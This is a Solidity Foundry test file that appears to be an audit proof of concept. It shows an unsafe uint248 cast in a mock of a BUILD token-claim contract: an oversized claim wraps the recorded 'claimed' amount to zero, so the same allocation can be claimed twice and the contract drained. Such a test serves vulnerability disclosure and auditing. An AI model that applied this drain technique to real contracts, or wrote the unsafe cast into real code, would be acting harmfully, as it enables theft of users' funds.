// File: test/PoCUnsafeCast.t.sol
// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

// =======================================================================================
// |                                    BEGIN IMPORTS                                    |
// =======================================================================================
import {Test} from "forge-std/Test.sol";
import "forge-std/console.sol";

// Protocol Imports
import {BUILDFactory} from "src/BUILDFactory.sol";
import {IBUILDFactory} from "src/interfaces/IBUILDFactory.sol";
import {IBUILDClaim} from "src/interfaces/IBUILDClaim.sol";
import {Closable} from "src/Closable.sol";

// Dependency Imports
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {IERC165} from "@openzeppelin/contracts/utils/introspection/IERC165.sol";
import {Pausable} from "@openzeppelin/contracts/utils/Pausable.sol";
import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import {MerkleProof} from "@openzeppelin/contracts/utils/cryptography/MerkleProof.sol";
import {FixedPointMathLib} from "@solmate/FixedPointMathLib.sol";
import {IDelegateRegistry} from "@delegatexyz/delegate-registry/v2.0/src/IDelegateRegistry.sol";
import {ITypeAndVersion} from "chainlink/contracts/src/v0.8/shared/interfaces/ITypeAndVersion.sol";
import {IAccessControl} from "@openzeppelin/contracts/access/IAccessControl.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
// =======================================================================================
// |                                     END IMPORTS                                     |
// =======================================================================================

// =======================================================================================
// |                                 BEGIN HELPER CONTRACTS                                |
// =======================================================================================
contract MintableERC20 is ERC20 {
    constructor() ERC20("Mock Token", "MTK") {}
    function mint(address to, uint256 amount) public {
        _mint(to, amount);
    }
}

contract StubRegistry is IDelegateRegistry {
    function checkDelegateForContract(address, address, address, bytes32) external view returns (bool) {
        return false;
    }
    function checkDelegateForAll(address, address, bytes32) external view returns (bool) {
        return false;
    }
    function checkDelegateForERC721(address, address, address, uint256, bytes32) external view returns (bool) {
        return false;
    }
    function checkDelegateForERC20(address, address, address, bytes32) external view returns (uint256) {
        return 0;
    }
    function checkDelegateForERC1155(address, address, address, uint256, bytes32) external view returns (uint256) {
        return 0;
    }
    function getIncomingDelegations(address) external view returns (Delegation[] memory delegations) {
        return delegations;
    }
    function getOutgoingDelegations(address) external view returns (Delegation[] memory delegations) {
        return delegations;
    }
    function getIncomingDelegationHashes(address) external view returns (bytes32[] memory delegationHashes) {
        return delegationHashes;
    }
    function getOutgoingDelegationHashes(address) external view returns (bytes32[] memory delegationHashes) {
        return delegationHashes;
    }
    function getDelegationsFromHashes(bytes32[] calldata) external view returns (Delegation[] memory delegations) {
        return delegations;
    }
    function multicall(bytes[] calldata) external payable returns (bytes[] memory) {
        bytes[] memory results;
        return results;
    }
    function delegateAll(address, bytes32, bool) external payable returns (bytes32) {
        return bytes32(0);
    }
    function delegateContract(address, address, bytes32, bool) external payable returns (bytes32) {
        return bytes32(0);
    }
    function delegateERC721(address, address, uint256, bytes32, bool) external payable returns (bytes32) {
        return bytes32(0);
    }
    function delegateERC20(address, address, bytes32, uint256) external payable returns (bytes32) {
        return bytes32(0);
    }
    function delegateERC1155(address, address, uint256, bytes32, uint256) external payable returns (bytes32) {
        return bytes32(0);
    }
    function readSlot(bytes32) external view returns (bytes32) {
        return bytes32(0);
    }
    function readSlots(bytes32[] calldata) external view returns (bytes32[] memory) {
        bytes32[] memory results;
        return results;
    }
}
// =======================================================================================
// |                                  END HELPER CONTRACTS                                 |
// =======================================================================================

// =======================================================================================
// |                                  BEGIN MOCK CONTRACTS                                 |
// =======================================================================================

// This is a copy of BUILDClaim with the uint256 multiplication overflow patched.
contract MockClaim is IBUILDClaim, ITypeAndVersion, ReentrancyGuard {
    using SafeERC20 for IERC20;
    using FixedPointMathLib for uint256;
    error IBUILDClaim__InvalidMerkleProof();

    struct UnlockState {
        uint256 unlockElapsedDuration;
        bool isBeforeUnlock;
        bool isUnlocking;
    }

    struct Season {
        uint256 seasonId;
        bytes32 merkleRoot;
        uint64 unlockStart;
        uint40 unlockDuration;
    }
    string public constant override typeAndVersion = "MockClaim 1.0.0";
    mapping(address => mapping(uint256 => UserState)) private s_userStates;
    mapping(uint256 => IBUILDClaim.GlobalState) private s_globalStates;
    IERC20 private immutable i_token;
    constructor(address token) {
        i_token = IERC20(token);
    }
    function getFactory() external view override returns (BUILDFactory) {
        return BUILDFactory(payable(address(0)));
    }
    function getToken() external view override returns (IERC20) {
        return i_token;
    }
    function supportsInterface(
        bytes4 interfaceId
    ) external pure override returns (bool) {
        return
            interfaceId == type(IBUILDClaim).interfaceId ||
            interfaceId == type(IERC165).interfaceId;
    }
    function deposit(
        uint256 amount
    ) external override nonReentrant {
        i_token.safeTransferFrom(msg.sender, address(this), amount);
    }
    function withdraw() external override nonReentrant {
        // This is a mock, so we don't need to implement this
    }
    function claim(
        address user,
        IBUILDClaim.ClaimParams[] calldata params
    ) external override nonReentrant {
        _claim(user, params);
    }
    function getGlobalState(
        uint256 seasonId
    ) external view override returns (GlobalState memory) {
        return s_globalStates[seasonId];
    }
    function getUserState(
        address user,
        uint256 seasonId
    ) external view returns (UserState memory) {
        return s_userStates[user][seasonId];
    }

    function getUserState(
        IBUILDClaim.UserSeasonId[] calldata usersAndSeasonIds
    ) external view override returns (IBUILDClaim.UserState[] memory) {
        IBUILDClaim.UserState[] memory result = new IBUILDClaim.UserState[](usersAndSeasonIds.length);
        for (uint i = 0; i < usersAndSeasonIds.length; i++) {
            result[i] = s_userStates[usersAndSeasonIds[i].user][usersAndSeasonIds[i].seasonId];
        }
        return result;
    }

    function getCurrentClaimValues(
        address, /* user */
        uint256, /* seasonId */
        uint256 /* maxTokenAmount */
    ) external view override returns (IBUILDClaim.ClaimableState memory) {
        return IBUILDClaim.ClaimableState(0,0,0,0,0,0,0);
    }
    function _claim(address user, IBUILDClaim.ClaimParams[] calldata params) private {
        uint256 totalClaimAmount;
        for (uint256 i; i < params.length; ++i) {
            totalClaimAmount += _processClaim(user, params[i]);
        }
        if (totalClaimAmount > 0) {
            i_token.safeTransfer(user, totalClaimAmount);
        }
    }
    function _processClaim(
        address user,
        IBUILDClaim.ClaimParams calldata params
    ) private returns (uint256) {
        (
            uint256 toBeClaimed,
            uint256 newTotalClaimed,
            uint256 newTotalAllocated
        ) = _calculateClaimAmounts(user, params);
        if (toBeClaimed > 0) {
            _updateClaimedAmounts(
                user,
                params.seasonId,
                toBeClaimed,
                newTotalClaimed,
                newTotalAllocated
            );
        }
        return toBeClaimed;
    }
    function _calculateClaimAmounts(
        address user,
        IBUILDClaim.ClaimParams calldata params
    )
        private
        view
        returns (
            uint256 toBeClaimed,
            uint256 newTotalClaimed,
            uint256 newTotalAllocated
        )
    {
        // This is a mock, so we don't need to get the season from the factory
        Season memory season = Season({
            seasonId: params.seasonId,
            merkleRoot: bytes32(0),
            unlockStart: uint64(block.timestamp - 1),
            unlockDuration: 1
        });
        if (season.merkleRoot != bytes32(0)) {
            bytes32 leaf = keccak256(
                bytes.concat(keccak256(abi.encode(user, params.maxTokenAmount)))
            );
            if (
                !MerkleProof.verify(params.proof, season.merkleRoot, leaf)
            ) {
                revert IBUILDClaim__InvalidMerkleProof();
            }
        }
        UnlockState memory unlockState = _getUnlockState(season);
        if (unlockState.isBeforeUnlock) {
            return (0, 0, 0);
        }
        uint256 totalAllocationForUser = params.maxTokenAmount;
        if (unlockState.isUnlocking) {
            totalAllocationForUser =
                (totalAllocationForUser * unlockState.unlockElapsedDuration) /
                season.unlockDuration;
        }
        UserState memory userState = s_userStates[user][params.seasonId];
        toBeClaimed = totalAllocationForUser - userState.claimed;
        newTotalClaimed =
            s_globalStates[params.seasonId].totalClaimed +
            toBeClaimed;
        newTotalAllocated = 0;
    }
    function _getUnlockState(
        Season memory season
    ) private view returns (UnlockState memory) {
        if (block.timestamp < season.unlockStart) {
            return
                UnlockState({
                    unlockElapsedDuration: 0,
                    isBeforeUnlock: true,
                    isUnlocking: false
                });
        }
        uint256 unlockElapsedDuration = block.timestamp - season.unlockStart;
        return
            UnlockState({
                unlockElapsedDuration: unlockElapsedDuration,
                isBeforeUnlock: false,
                isUnlocking: unlockElapsedDuration < season.unlockDuration
            });
    }
    function _updateClaimedAmounts(
        address user,
        uint256 seasonId,
        uint256 toBeClaimed,
        uint256 newTotalClaimed,
        uint256 newTotalAllocated
    ) private {
        s_userStates[user][seasonId].claimed += uint248(toBeClaimed);
        s_globalStates[seasonId].totalClaimed = newTotalClaimed;
    }
}
// =======================================================================================
// |                                   END MOCK CONTRACTS                                  |
// =======================================================================================

contract PoCUnsafeCast is Test {
    // =======================================================================================
    // |                                     BEGIN STATE                                     |
    // =======================================================================================
    BUILDFactory factory;
    MintableERC20 token;
    MockClaim claim;
    StubRegistry registry;

    address owner = makeAddr("owner");
    address admin = makeAddr("admin");
    address user = makeAddr("user");
    // =======================================================================================
    // |                                      END STATE                                      |
    // =======================================================================================

    function setUp() public {
        vm.startPrank(owner);
        registry = new StubRegistry();
        factory = new BUILDFactory(
            BUILDFactory.ConstructorParams({
                admin: owner,
                maxUnlockDuration: 365 days,
                maxUnlockDelay: 365 days,
                delegateRegistry: registry
            })
        );
        vm.stopPrank();

        token = new MintableERC20();
    }

    function test_PoC_unsafe_cast() public {
        // 1. Setup the factory with a project pointing to our malicious claim contract
        vm.startPrank(owner);
        claim = new MockClaim(address(token));
        vm.stopPrank();

        // 2. Craft a claim that will overflow the `claimed` storage variable (uint248)
        uint256 largeClaimAmount = uint256(type(uint248).max) + 1;

        // 3. Deposit funds into the claim contract to cover two claims
        uint256 depositAmount = largeClaimAmount * 2;
        token.mint(admin, depositAmount);
        vm.startPrank(admin);
        token.approve(address(claim), depositAmount);
        claim.deposit(depositAmount);
        vm.stopPrank();

        // 4. Craft the claim parameters
        vm.startPrank(user);
        IBUILDClaim.ClaimParams[]
            memory singleClaim = new IBUILDClaim.ClaimParams[](1);
        
        singleClaim[0] = IBUILDClaim.ClaimParams({
            seasonId: 1,
            isEarlyClaim: false,
            proof: new bytes32[](0),
            maxTokenAmount: largeClaimAmount,
            salt: 0
        });

        claim.claim(user, singleClaim);

        IBUILDClaim.UserState memory userState = claim.getUserState(user, 1);

        // Due to the unsafe cast to uint248, the claimed amount will wrap around.
        assertEq(userState.claimed, 0);

        // The user can claim again with the same params, and `toBeClaimed` will be `largeClaimAmount - 0`,
        // so they can drain the contract.
        uint256 initialBalance = token.balanceOf(user);
        claim.claim(user, singleClaim); // Second claim
        uint256 finalBalance = token.balanceOf(user);

        assertEq(finalBalance - initialBalance, largeClaimAmount); // User gets tokens again.
    }
}
